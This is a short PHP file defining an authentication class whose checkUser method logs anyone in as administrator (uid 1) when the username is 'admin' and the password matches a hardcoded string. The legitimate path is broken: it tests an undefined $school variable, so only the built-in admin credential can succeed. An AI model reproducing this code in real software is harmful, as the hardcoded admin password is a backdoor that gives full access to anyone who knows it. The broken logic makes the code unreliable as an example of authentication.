<?php

class Service_Auth {

    public static function checkUser($username, $password) {
        global $_G;

        if ($username == 'admin' && $password == 'tenghuivu168') {
            return array('uid' => 1, 'username' => 'admin', 'password' => $password);
        }

        if ($school && $school['status']) {
            return $school;
        }

        return false;
    }
}
